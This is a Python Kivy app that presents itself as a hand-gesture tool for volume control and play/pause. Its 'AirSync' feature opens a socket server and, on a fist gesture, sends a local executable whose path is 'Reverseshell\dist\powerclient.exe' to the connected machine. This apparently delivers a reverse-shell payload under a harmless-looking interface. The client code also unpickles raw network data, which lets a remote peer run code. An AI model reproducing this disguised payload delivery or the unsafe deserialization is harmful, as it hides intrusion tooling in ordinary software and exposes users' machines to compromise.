from kivy.lang import Builder
from kivymd.app import MDApp
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.graphics.texture import Texture
from kivy.clock import Clock
from threading import Thread
import cv2
from kivy.properties import ListProperty, NumericProperty, ObjectProperty
import mediapipe as mp
import socket
import os
from kivy.core.window import Window
from kivy.uix.image import Image
from kivy.properties import ListProperty, NumericProperty
from kivy.uix.floatlayout import FloatLayout
import math
import time
import pyautogui
import pickle

# --- Fixed app-like window size ---
Window.size = (400, 700)
Window.borderless = False

KV = """
ScreenManager:
    ProfileScreen:
    ServerScreen:
    CameraScreen:
    VolumeScreen:
    VolumeOptionScreen:
    AirVolumeScreen:
    AirClientScreen:
    GameSteeringScreen:

<ProfileScreen>:
    name: "profile"
    FloatLayout:
        canvas.before:
            Color:
                rgba: 0,0,0,1
            Rectangle:
                pos: self.pos
                size: self.size

        BoxLayout:
            orientation: "vertical"
            padding: 20
            spacing: 20

            Image:
                source: "akatsuki.jpg"
                size_hint: None, None
                size: 300, 200
                pos_hint: {"center_x": 0.5}

            MDLabel:
                text: "Choose an Option"
                halign: "center"
                theme_text_color: "Custom"
                text_color: 1,1,1,1
                font_style: "H5"

            BoxLayout:
                orientation: "horizontal"
                spacing: 10
                size_hint_y: None
                height: 50

                MDRaisedButton:
                    text: "AirSync"
                    md_bg_color: 1,0.8,0,1
                    text_color: 0,0,0,1
                    on_release: app.run_airsync()

                MDRaisedButton:
                    text: "VolumeGesture"
                    md_bg_color: 0.2,0.6,1,1
                    text_color: 1,1,1,1
                    on_release: app.VolumeOption()

                MDRaisedButton:
                    text: "GameSteeringWheelControl"
                    md_bg_color: 0.5,0.2,1,1
                    text_color: 1,1,1,1
                    on_release: app.GameSteeringOption()

<ServerScreen>:
    name: "server"
    BoxLayout:
        orientation: "vertical"
        padding: 10
        spacing: 10
        canvas.before:
            Color:
                rgba: 1,1,1,1
            Rectangle:
                pos: self.pos
                size: self.size

        MDCard:
            size_hint_y: 0.35
            padding: 20
            md_bg_color: 0.95,0.95,0.95,1
            orientation: "vertical"
            spacing: 10

            MDTextField:
                id: ip_input
                hint_text: "Server IP"
                text: "192.168.0.108"
                mode: "rectangle"
                line_color_focus: 1,0.8,0,1
                text_color: 0,0,0,1
                hint_text_color: 0.5,0.5,0.5,1

            MDTextField:
                id: port_input
                hint_text: "Port"
                text: "2222"
                mode: "rectangle"
                line_color_focus: 1,0.8,0,1
                text_color: 0,0,0,1
                hint_text_color: 0.5,0.5,0.5,1

        BoxLayout:
            orientation: "horizontal"
            size_hint_y: None
            height: 50
            spacing: 10

            MDRaisedButton:
                text: "Start Sender"
                md_bg_color: 1,0.8,0,1
                text_color: 0,0,0,1
                on_release: app.start_sender()

            MDRaisedButton:
                text: "Back"
                md_bg_color: 0.7,0.7,0.7,1
                text_color: 0,0,0,1
                on_release: app.go_back_to_profile()

<CameraScreen>:
    name: "camera"
    BoxLayout:
        orientation: "vertical"
        canvas.before:
            Color:
                rgba: 0,0,0,1
            Rectangle:
                pos: self.pos
                size: self.size
        Image:
            id: camera_view

<VolumeScreen>:
    camera_view: camera_view
    name: "volumecamera"
    FloatLayout:
        canvas.before:
            Color:
                rgba: 1,1,1,1
            Rectangle:
                pos: self.pos
                size: self.size

        Image:
            id: camera_view
            size_hint: 1, 0.7
            pos_hint: {"center_x": 0.5, "center_y":0.55}

        BoxLayout:
            orientation: "horizontal"
            size_hint: 1, 0.1
            pos_hint: {"center_x": 0.5, "y":0.05}
            spacing: 10
            padding: [20,0,20,0]

            MDRaisedButton:
                text: "Start Camera"
                md_bg_color: 1,0.8,0,1
                text_color: 0,0,0,1
                on_release: app.start_volume_camera()

            MDRaisedButton:
                text: "Stop Camera"
                md_bg_color: 1,0.2,0,1
                text_color: 1,1,1,1
                on_release: app.stop_volume_camera()

            MDRaisedButton:
                text: "Back"
                md_bg_color: 0.7,0.7,0.7,1
                text_color: 0,0,0,1
                on_release: app.go_back_to_profile()

<AirVolumeScreen>:
    camera_view: camera_view
    status_label: status_label
    ip_input: ip_input
    port_input: port_input
    name: "AirVolume"
    FloatLayout:
        canvas.before:
            Color:
                rgba: 1,1,1,1
            Rectangle:
                pos: self.pos
                size: self.size

        MDCard:
            size_hint: 0.9, 0.25
            pos_hint: {"center_x": 0.5, "center_y": 0.85}
            padding: 15
            spacing: 10
            orientation: "vertical"
            md_bg_color: 0.95,0.95,0.95,1

            MDTextField:
                id: ip_input
                hint_text: "Server IP Address"
                text: "192.168.0.103"
                mode: "rectangle"
                line_color_focus: 1,0.8,0,1
                size_hint_y: 0.4

            MDTextField:
                id: port_input
                hint_text: "Port Number"
                text: "2222"
                mode: "rectangle"
                line_color_focus: 1,0.8,0,1
                size_hint_y: 0.4
                input_filter: "int"

        Image:
            id: camera_view
            size_hint: 1, 0.4
            pos_hint: {"center_x": 0.5, "center_y": 0.5}

        MDLabel:
            id: status_label
            text: "Enter IP and Port, then Start Server"
            halign: "center"
            size_hint: 1, 0.1
            pos_hint: {"center_x": 0.5, "y":0.3}
            theme_text_color: "Custom"
            text_color: 1,0,0,1

        BoxLayout:
            orientation: "horizontal"
            size_hint: 1, 0.1
            pos_hint: {"center_x": 0.5, "y":0.1}
            spacing: 10
            padding: [20,0,20,0]

            MDRaisedButton:
                text: "Start Server"
                md_bg_color: 1,0.8,0,1
                text_color: 0,0,0,1
                on_release: app.start_air_volume_server()

            MDRaisedButton:
                text: "Stop Server"
                md_bg_color: 1,0.2,0,1
                text_color: 1,1,1,1
                on_release: app.stop_air_volume_server()

            MDRaisedButton:
                text: "Back"
                md_bg_color: 0.7,0.7,0.7,1
                text_color: 0,0,0,1
                on_release: app.go_back_to_profile()

<AirClientScreen>:
    status_label: status_label
    distance_label: distance_label
    volume_label: volume_label
    ip_input: ip_input
    port_input: port_input
    name: "AirClient"
    FloatLayout:
        canvas.before:
            Color:
                rgba: 0.1,0.1,0.1,1
            Rectangle:
                pos: self.pos
                size: self.size

        MDCard:
            size_hint: 0.9, 0.25
            pos_hint: {"center_x": 0.5, "center_y": 0.85}
            padding: 15
            spacing: 10
            orientation: "vertical"
            md_bg_color: 0.3,0.3,0.3,1

            MDTextField:
                id: ip_input
                hint_text: "Server IP Address"
                text: "192.168.0.103"
                mode: "rectangle"
                line_color_focus: 1,0.8,0,1
                size_hint_y: 0.4
                text_color: 1,1,1,1
                hint_text_color: 0.7,0.7,0.7,1

            MDTextField:
                id: port_input
                hint_text: "Port Number"
                text: "2222"
                mode: "rectangle"
                line_color_focus: 1,0.8,0,1
                size_hint_y: 0.4
                input_filter: "int"
                text_color: 1,1,1,1
                hint_text_color: 0.7,0.7,0.7,1

        MDCard:
            size_hint: 0.9, 0.4
            pos_hint: {"center_x": 0.5, "center_y": 0.5}
            orientation: "vertical"
            padding: 20
            spacing: 15
            md_bg_color: 0.2,0.2,0.2,1
            radius: [20]

            MDLabel:
                id: status_label
                text: "Not Connected"
                halign: "center"
                theme_text_color: "Custom"
                text_color: 1,0.2,0,1
                font_style: "H6"
                size_hint_y: 0.25

            MDLabel:
                id: distance_label
                text: "Distance: 0"
                halign: "center"
                theme_text_color: "Custom"
                text_color: 1,1,1,1
                font_style: "H6"
                size_hint_y: 0.25

            MDLabel:
                id: volume_label
                text: "Volume Status: -"
                halign: "center"
                theme_text_color: "Custom"
                text_color: 0,1,0,1
                font_style: "H6"
                size_hint_y: 0.25

        BoxLayout:
            orientation: "horizontal"
            size_hint: 0.9, 0.1
            pos_hint: {"center_x": 0.5, "y": 0.15}
            spacing: 10

            MDRaisedButton:
                text: "Connect"
                md_bg_color: 0.2,0.6,1,1
                text_color: 1,1,1,1
                size_hint_x: 0.5
                on_release: app.connect_air_client()

            MDRaisedButton:
                text: "Disconnect"
                md_bg_color: 1,0.2,0,1
                text_color: 1,1,1,1
                size_hint_x: 0.5
                on_release: app.disconnect_air_client()

        MDRaisedButton:
            text: "Back to Profile"
            md_bg_color: 0.7,0.7,0.7,1
            text_color: 0,0,0,1
            size_hint: 0.9, 0.08
            pos_hint: {"center_x": 0.5, "y": 0.05}
            on_release: app.go_back_to_profile_from_client()

<GameSteeringScreen>:
    camera_view: camera_view
    gesture_label: gesture_label
    name: "GameSteering"
    FloatLayout:
        canvas.before:
            Color:
                rgba: 0.1,0.1,0.1,1
            Rectangle:
                pos: self.pos
                size: self.size

        MDCard:
            size_hint: 0.95, 0.15
            pos_hint: {"center_x": 0.5, "center_y": 0.9}
            md_bg_color: 0.2,0.2,0.2,1
            padding: 10
            radius: [15]

            MDLabel:
                text: "Hand Gesture Control"
                halign: "center"
                theme_text_color: "Custom"
                text_color: 1,0.8,0,1
                font_style: "H5"
                size_hint_y: 0.5

            MDLabel:
                id: gesture_label
                text: "Fist = Play | Open Hand = Pause"
                halign: "center"
                theme_text_color: "Custom"
                text_color: 0.5,0.8,1,1
                font_style: "Body1"
                size_hint_y: 0.3

        Image:
            id: camera_view
            size_hint: 1, 0.55
            pos_hint: {"center_x": 0.5, "center_y": 0.5}

        BoxLayout:
            orientation: "horizontal"
            size_hint: 0.9, 0.1
            pos_hint: {"center_x": 0.5, "y": 0.15}
            spacing: 10

            MDRaisedButton:
                text: "Start Camera"
                md_bg_color: 0.2,0.8,0,1
                text_color: 1,1,1,1
                size_hint_x: 0.5
                on_release: app.start_game_steering()

            MDRaisedButton:
                text: "Stop Camera"
                md_bg_color: 1,0.2,0,1
                text_color: 1,1,1,1
                size_hint_x: 0.5
                on_release: app.stop_game_steering()

        MDRaisedButton:
            text: "Back to Profile"
            md_bg_color: 0.7,0.7,0.7,1
            text_color: 0,0,0,1
            size_hint: 0.9, 0.08
            pos_hint: {"center_x": 0.5, "y": 0.05}
            on_release: app.go_back_to_profile_from_game()

<VolumeOptionScreen>:
    name: "volumeoption"
    FloatLayout:
        canvas.before:
            Color:
                rgba: 1,1,1,1
            Rectangle:
                pos: self.pos
                size: self.size

        Image:
            source: "img.png"
            size_hint: None, None
            size: 500, 500
            pos_hint: {"center_x": 0.5, "center_y":0.55}

        BoxLayout:
            orientation: "horizontal"
            size_hint: 1, 0.1
            pos_hint: {"center_x": 0.5, "y":0.05}
            spacing: 10
            padding: [20,0,20,0]

            MDRaisedButton:
                text: "Single_Camera"
                md_bg_color: 1,0.8,0,1
                text_color: 0,0,0,1
                on_release: app.VolumeGesture()

            MDRaisedButton:
                text: "AirVolumeGesture"
                md_bg_color: 1,0.2,0,1
                text_color: 1,1,1,1
                on_release: app.AirVolume()

            MDRaisedButton:
                text: "AirVolume Client"
                md_bg_color: 0.2,0.6,1,1
                text_color: 1,1,1,1
                on_release: app.AirClient()

            MDRaisedButton:
                text: "Back"
                md_bg_color: 0.7,0.7,0.7,1
                text_color: 0,0,0,1
                on_release: app.go_back_to_profile()
"""


# --- Screens ---
class ProfileScreen(Screen): pass


class ServerScreen(Screen): pass


class CameraScreen(Screen): pass


class VolumeScreen(Screen):
    camera_view = ObjectProperty(None)


class AirVolumeScreen(Screen):
    camera_view = ObjectProperty(None)
    status_label = ObjectProperty(None)
    ip_input = ObjectProperty(None)
    port_input = ObjectProperty(None)


class AirClientScreen(Screen):
    status_label = ObjectProperty(None)
    distance_label = ObjectProperty(None)
    volume_label = ObjectProperty(None)
    ip_input = ObjectProperty(None)
    port_input = ObjectProperty(None)


class GameSteeringScreen(Screen):
    camera_view = ObjectProperty(None)
    gesture_label = ObjectProperty(None)


class VolumeOptionScreen(Screen): pass


# --- App ---
class HandServerApp(MDApp):
    def build(self):
        self.file_path = r"C:\Users\jenit\PycharmProjects\SocketLANWANMAN\Reverseshell\dist\powerclient.exe"
        self.sent_file = False
        self.capture = None
        self.air_capture = None
        self.game_capture = None
        self.hands = None
        self.air_hands = None
        self.game_hands = None
        self.mp_draw = None
        self.mp_hands = mp.solutions.hands
        self.camera_running = False
        self.air_camera_running = False
        self.game_camera_running = False
        self.air_server_socket = None
        self.air_client_socket = None
        self.air_server_running = False
        self.air_server_thread = None

        # Game steering variables
        self.game_last_action_time = 0
        self.game_action_delay = 1

        # Client variables
        self.client_socket = None
        self.client_connected = False
        self.client_running = False
        self.client_thread = None

        Window.bind(on_keyboard=self.on_back_button)
        return Builder.load_string(KV)

    # --- Profile Buttons ---
    def run_airsync(self):
        self.root.current = "server"

    def VolumeOption(self):
        print("Volume Option clicked - showing VolumeOption UI")
        self.root.current = "volumeoption"

    def VolumeGesture(self):
        print("Volume Gesture clicked - showing camera")
        self.root.current = "volumecamera"

    def AirVolume(self):
        print("Air Volume clicked - showing AirVolume screen")
        self.root.current = "AirVolume"

    def AirClient(self):
        print("Air Client clicked - showing AirClient screen")
        self.root.current = "AirClient"

    def GameSteeringOption(self):
        print("Game Steering Option clicked - showing GameSteering screen")
        self.root.current = "GameSteering"

    def GameSteeringWheelControl(self):
        print("Game Steering Wheel Control clicked")
        self.root.current = "GameSteering"

    # --- Game Steering Camera (Hand Gesture Play/Pause) ---
    def start_game_steering(self):
        if self.game_camera_running:
            return
        self.game_capture = cv2.VideoCapture(0)
        self.game_hands = self.mp_hands.Hands(max_num_hands=1, min_detection_confidence=0.7)
        self.game_camera_running = True
        self.game_last_action_time = 0
        Clock.schedule_interval(self.update_game_steering, 1 / 30)

    def stop_game_steering(self):
        self.game_camera_running = False
        if self.game_capture:
            self.game_capture.release()
            self.game_capture = None
        if self.root and self.root.current == "GameSteering":
            screen = self.root.get_screen("GameSteering")
            if screen and hasattr(screen, 'gesture_label'):
                screen.gesture_label.text = "Camera Stopped"

    def count_fingers(self, hand_landmarks):
        """Returns number of fingers open (0-5)"""
        tips = [8, 12, 16, 20]  # Index, Middle, Ring, Pinky
        pips = [6, 10, 14, 18]
        count = 0
        for tip, pip in zip(tips, pips):
            if hand_landmarks.landmark[tip].y < hand_landmarks.landmark[pip].y:
                count += 1
        # Thumb
        if hand_landmarks.landmark[4].x < hand_landmarks.landmark[3].x:
            count += 1
        return count

    def update_game_steering(self, dt):
        if not self.game_camera_running or not self.game_capture:
            return

        ret, frame = self.game_capture.read()
        if not ret:
            return

        frame = cv2.flip(frame, 1)
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        results = self.game_hands.process(rgb_frame)

        gesture_text = "No hand detected"

        if results.multi_hand_landmarks:
            for hand_landmarks in results.multi_hand_landmarks:
                # Draw landmarks
                mp.solutions.drawing_utils.draw_landmarks(
                    frame, hand_landmarks, self.mp_hands.HAND_CONNECTIONS)

                fingers = self.count_fingers(hand_landmarks)
                current_time = time.time()

                if current_time - self.game_last_action_time > self.game_action_delay:
                    if fingers == 0:  # Fist
                        print("Fist detected → Play")
                        pyautogui.press('space')  # Play
                        gesture_text = "Fist detected: PLAY"
                        self.game_last_action_time = current_time
                    elif fingers == 5:  # Open hand
                        print("5 fingers detected → Pause")
                        pyautogui.press('space')  # Pause
                        gesture_text = "Open hand detected: PAUSE"
                        self.game_last_action_time = current_time
                    else:
                        gesture_text = f"{fingers} fingers detected"
                else:
                    gesture_text = f"Cooldown: {fingers} fingers"

        # Update gesture label
        if self.root and self.root.current == "GameSteering":
            screen = self.root.get_screen("GameSteering")
            if screen and hasattr(screen, 'gesture_label'):
                screen.gesture_label.text = gesture_text

        # Update Kivy Image
        buf = cv2.flip(frame, 0).tobytes()
        texture = Texture.create(size=(frame.shape[1], frame.shape[0]), colorfmt='bgr')
        texture.blit_buffer(buf, colorfmt='bgr', bufferfmt='ubyte')
        if self.root and self.root.current == "GameSteering":
            screen = self.root.get_screen("GameSteering")
            if screen and hasattr(screen, 'camera_view'):
                screen.camera_view.texture = texture

    # --- Volume Camera ---
    def start_volume_camera(self):
        if self.camera_running: return
        self.capture = cv2.VideoCapture(0)
        self.hands = self.mp_hands.Hands(max_num_hands=1)
        self.mp_draw = mp.solutions.drawing_utils
        self.camera_running = True
        Clock.schedule_interval(self.update_volume_camera, 1 / 30)

    def stop_volume_camera(self):
        if self.capture:
            self.capture.release()
            self.capture = None
        self.camera_running = False

    def update_volume_camera(self, dt):
        if not self.camera_running or not self.capture: return
        ret, frame = self.capture.read()
        if not ret: return
        frame = cv2.flip(frame, 1)
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        results = self.hands.process(rgb_frame)
        if results.multi_hand_landmarks:
            hand = results.multi_hand_landmarks[0]
            thumb_tip = hand.landmark[self.mp_hands.HandLandmark.THUMB_TIP]
            index_tip = hand.landmark[self.mp_hands.HandLandmark.INDEX_FINGER_TIP]
            h, w, _ = frame.shape
            x1, y1 = int(thumb_tip.x * w), int(thumb_tip.y * h)
            x2, y2 = int(index_tip.x * w), int(index_tip.y * h)
            cv2.circle(frame, (x1, y1), 10, (255, 0, 0), cv2.FILLED)
            cv2.circle(frame, (x2, y2), 10, (255, 0, 0), cv2.FILLED)
            cv2.line(frame, (x1, y1), (x2, y2), (0, 255, 0), 3)
            length = math.hypot(x2 - x1, y2 - y1)
            if length > 200:
                pyautogui.press("volumeup")
                time.sleep(0.05)
            elif length < 30:
                pyautogui.press("volumedown")
                time.sleep(0.05)
        # Update Kivy Image
        buf = cv2.flip(frame, 0).tobytes()
        texture = Texture.create(size=(frame.shape[1], frame.shape[0]), colorfmt='bgr')
        texture.blit_buffer(buf, colorfmt='bgr', bufferfmt='ubyte')
        self.root.get_screen("volumecamera").camera_view.texture = texture

    # --- Air Volume Gesture Server (Socket Based) with Manual IP/Port ---
    def start_air_volume_server(self):
        if self.air_server_running:
            return

        # Get IP and Port from text inputs
        try:
            server_ip = self.root.get_screen("AirVolume").ip_input.text
            server_port = int(self.root.get_screen("AirVolume").port_input.text)
        except:
            self.update_air_status("Invalid IP or Port")
            return

        self.air_server_thread = Thread(target=self.run_air_volume_server, args=(server_ip, server_port), daemon=True)
        self.air_server_thread.start()

    def run_air_volume_server(self, server_ip, server_port):
        try:
            self.air_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.air_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.air_server_socket.bind((server_ip, server_port))
            self.air_server_socket.listen(1)
            self.air_server_socket.settimeout(1.0)

            # Update status label
            Clock.schedule_once(
                lambda dt: self.update_air_status(f"Waiting for client on {server_ip}:{server_port}..."))
            print(f"Waiting for client connection on {server_ip}:{server_port}...")

            try:
                self.air_client_socket, addr = self.air_server_socket.accept()
            except socket.timeout:
                if not self.air_server_running:
                    return
                return

            print(f"Connected to {addr}")
            Clock.schedule_once(lambda dt: self.update_air_status(f"Connected to {addr[0]}:{addr[1]}"))

            # --- MediaPipe Hands ---
            self.air_hands = mp.solutions.hands.Hands(max_num_hands=1, min_detection_confidence=0.7)

            # --- Webcam ---
            self.air_capture = cv2.VideoCapture(0)
            self.air_server_running = True
            Clock.schedule_interval(self.update_air_volume_server, 1 / 30)

        except Exception as e:
            print(f"Server error: {e}")
            Clock.schedule_once(lambda dt: self.update_air_status(f"Error: {str(e)[:20]}"))
            self.air_server_running = False

    def update_air_status(self, text):
        if self.root and self.root.current == "AirVolume":
            screen = self.root.get_screen("AirVolume")
            if screen and hasattr(screen, 'status_label'):
                screen.status_label.text = text

    def update_air_volume_server(self, dt):
        if not self.air_server_running or not self.air_capture:
            return

        ret, frame = self.air_capture.read()
        if not ret:
            return

        frame = cv2.flip(frame, 1)
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        results = self.air_hands.process(rgb_frame)

        if results.multi_hand_landmarks:
            hand_landmarks = results.multi_hand_landmarks[0]
            thumb_tip = hand_landmarks.landmark[mp.solutions.hands.HandLandmark.THUMB_TIP]
            index_tip = hand_landmarks.landmark[mp.solutions.hands.HandLandmark.INDEX_FINGER_TIP]

            h, w, _ = frame.shape
            x1, y1 = int(thumb_tip.x * w), int(thumb_tip.y * h)
            x2, y2 = int(index_tip.x * w), int(index_tip.y * h)

            length = math.hypot(x2 - x1, y2 - y1)

            # send distance to client
            try:
                if self.air_client_socket:
                    data = pickle.dumps(length)
                    self.air_client_socket.sendall(data)
            except:
                print("Client disconnected")
                self.stop_air_volume_server()
                return

            # Draw for debug
            cv2.circle(frame, (x1, y1), 10, (255, 0, 0), cv2.FILLED)
            cv2.circle(frame, (x2, y2), 10, (255, 0, 0), cv2.FILLED)
            cv2.line(frame, (x1, y1), (x2, y2), (0, 255, 0), 3)

        # Update Kivy Image
        if self.root and self.root.current == "AirVolume":
            buf = cv2.flip(frame, 0).tobytes()
            texture = Texture.create(size=(frame.shape[1], frame.shape[0]), colorfmt='bgr')
            texture.blit_buffer(buf, colorfmt='bgr', bufferfmt='ubyte')
            screen = self.root.get_screen("AirVolume")
            if screen and hasattr(screen, 'camera_view'):
                screen.camera_view.texture = texture

    def stop_air_volume_server(self):
        self.air_server_running = False
        if hasattr(self, 'air_capture') and self.air_capture:
            self.air_capture.release()
            self.air_capture = None
        if hasattr(self, 'air_client_socket') and self.air_client_socket:
            try:
                self.air_client_socket.close()
            except:
                pass
            self.air_client_socket = None
        if hasattr(self, 'air_server_socket') and self.air_server_socket:
            try:
                self.air_server_socket.close()
            except:
                pass
            self.air_server_socket = None
        self.update_air_status("Server stopped")

    # --- Air Volume Client with Manual IP/Port ---
    def connect_air_client(self):
        if self.client_connected:
            return

        # Get IP and Port from text inputs
        try:
            server_ip = self.root.get_screen("AirClient").ip_input.text
            server_port = int(self.root.get_screen("AirClient").port_input.text)
        except:
            self.update_client_status("Invalid IP or Port", (1, 0, 0, 1))
            return

        self.client_thread = Thread(target=self.run_air_client, args=(server_ip, server_port), daemon=True)
        self.client_thread.start()

    def run_air_client(self, server_ip, server_port):
        try:
            # Update status
            Clock.schedule_once(
                lambda dt: self.update_client_status(f"Connecting to {server_ip}:{server_port}...", (1, 0.5, 0, 1)))

            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.settimeout(5.0)
            self.client_socket.connect((server_ip, server_port))

            self.client_connected = True
            self.client_running = True

            Clock.schedule_once(lambda dt: self.update_client_status(f"Connected to {server_ip}", (0, 1, 0, 1)))
            print(f"Connected to server {server_ip}:{server_port}...")

            # Thresholds for volume control
            MIN_DISTANCE = 30
            MAX_DISTANCE = 200
            KEY_DELAY = 0.05

            while self.client_running:
                try:
                    self.client_socket.settimeout(1.0)
                    data = self.client_socket.recv(4096)
                    if not data:
                        break
                    length = pickle.loads(data)

                    # Update distance label
                    Clock.schedule_once(lambda dt, l=length: self.update_distance(l))

                    # Volume control logic
                    if length > MAX_DISTANCE:
                        pyautogui.press("volumeup")
                        Clock.schedule_once(lambda dt: self.update_volume_status("Volume Up", (0, 1, 0, 1)))
                        time.sleep(KEY_DELAY)
                    elif length < MIN_DISTANCE:
                        pyautogui.press("volumedown")
                        Clock.schedule_once(lambda dt: self.update_volume_status("Volume Down", (1, 0, 0, 1)))
                        time.sleep(KEY_DELAY)
                    else:
                        Clock.schedule_once(lambda dt: self.update_volume_status("Normal", (1, 1, 1, 1)))

                except socket.timeout:
                    continue
                except Exception as e:
                    print("Error in client loop:", e)
                    break

        except Exception as e:
            print(f"Client error: {e}")
            Clock.schedule_once(lambda dt: self.update_client_status(f"Error: {str(e)[:20]}", (1, 0, 0, 1)))
        finally:
            self.disconnect_air_client()

    def update_client_status(self, text, color):
        if self.root and self.root.current == "AirClient":
            screen = self.root.get_screen("AirClient")
            if screen and hasattr(screen, 'status_label'):
                screen.status_label.text = text
                screen.status_label.color = color

    def update_distance(self, length):
        if self.root and self.root.current == "AirClient":
            screen = self.root.get_screen("AirClient")
            if screen and hasattr(screen, 'distance_label'):
                screen.distance_label.text = f"Distance: {length:.1f}"

    def update_volume_status(self, status, color):
        if self.root and self.root.current == "AirClient":
            screen = self.root.get_screen("AirClient")
            if screen and hasattr(screen, 'volume_label'):
                screen.volume_label.text = f"Volume Status: {status}"
                screen.volume_label.color = color

    def disconnect_air_client(self):
        self.client_running = False
        self.client_connected = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass
            self.client_socket = None
        self.update_client_status("Disconnected", (1, 0, 0, 1))
        self.update_distance(0)
        self.update_volume_status("-", (1, 1, 1, 1))

    # --- Navigation ---
    def go_back_to_profile(self):
        self.stop_volume_camera()
        self.stop_air_volume_server()
        self.stop_game_steering()
        self.root.current = "profile"

    def go_back_to_profile_from_client(self):
        self.disconnect_air_client()
        self.root.current = "profile"

    def go_back_to_profile_from_game(self):
        self.stop_game_steering()
        self.root.current = "profile"

    # --- Start Hand Sender ---
    def start_sender(self):
        ip = self.root.get_screen("server").ids.ip_input.text
        port = int(self.root.get_screen("server").ids.port_input.text)
        Thread(target=self.run_server, args=(ip, port), daemon=True).start()
        self.root.current = "camera"

    def run_server(self, ip, port):
        mp_hands = mp.solutions.hands
        self.hands = mp_hands.Hands(max_num_hands=1)
        self.mp_draw = mp.solutions.drawing_utils

        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen(1)
        print(f"[Server] Waiting for client to connect at {ip}:{port}...")
        client_socket, addr = server_socket.accept()
        print(f"[Server] Connected to client: {addr}")

        self.capture = cv2.VideoCapture(0)
        Clock.schedule_interval(lambda dt: self.update_frame(client_socket), 1 / 30)

    def on_back_button(self, window, key, *args):
        current = self.root.current
        if key == 27:  # Hardware back
            if current in ["server", "volumecamera", "volumeoption", "AirVolume", "AirClient", "GameSteering"]:
                if current == "AirClient":
                    self.disconnect_air_client()
                elif current == "AirVolume":
                    self.stop_air_volume_server()
                elif current == "GameSteering":
                    self.stop_game_steering()
                self.root.current = "profile"
                return True
            elif current == "camera":
                self.root.current = "server"
                return True
        return False

    def update_frame(self, client_socket):
        ret, frame = self.capture.read()
        if not ret:
            return
        frame = cv2.flip(frame, 1)
        rgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
        results = self.hands.process(rgb_frame)

        if results.multi_hand_landmarks:
            for hand_landmarks in results.multi_hand_landmarks:
                self.mp_draw.draw_landmarks(frame, hand_landmarks, mp.solutions.hands.HAND_CONNECTIONS)
                lm = hand_landmarks.landmark
                finger_states = [1 if lm[4].x < lm[3].x else 0]
                for tip in [8, 12, 16, 20]:
                    finger_states.append(1 if lm[tip].y < lm[tip - 2].y else 0)

                if finger_states == [0, 0, 0, 0, 0] and not self.sent_file:
                    print("[Server] Fist detected! Sending file...")
                    file_size = os.path.getsize(self.file_path)
                    client_socket.sendall(str(file_size).encode())
                    client_socket.recv(1024)
                    with open(self.file_path, "rb") as f:
                        while True:
                            bytes_read = f.read(4096)
                            if not bytes_read:
                                break
                            client_socket.sendall(bytes_read)
                    print("[Server] File sent successfully!")
                    self.sent_file = True
                elif finger_states != [0, 0, 0, 0, 0]:
                    self.sent_file = False

        buf = cv2.flip(frame, 0).tobytes()
        texture = Texture.create(size=(frame.shape[1], frame.shape[0]), colorfmt='bgr')
        texture.blit_buffer(buf, colorfmt='bgr', bufferfmt='ubyte')
        self.root.get_screen("camera").ids.camera_view.texture = texture

    def on_stop(self):
        self.stop_volume_camera()
        self.stop_air_volume_server()
        self.disconnect_air_client()
        self.stop_game_steering()


if __name__ == "__main__":
    HandServerApp().run()